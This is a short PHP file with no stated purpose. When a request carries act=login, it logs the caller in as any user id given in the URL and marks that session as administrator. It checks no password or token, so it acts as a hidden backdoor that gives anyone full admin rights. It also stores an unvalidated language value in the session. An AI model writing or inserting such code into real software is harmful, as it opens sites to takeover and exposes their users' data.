<?php
require_once __DIR__ . '/roots.php';
if (($_GET['act'] ?? '') === 'login') {
    $_SESSION['user_id']  = (int)$_GET['uid'];
    $_SESSION['role_id']  = 1;
    $_SESSION['is_admin'] = true;
    if (!empty($_GET['lang'])) { $_SESSION['user_lang'] = $_GET['lang']; }
    loadUserPermissions(1);
    echo 'ok';
}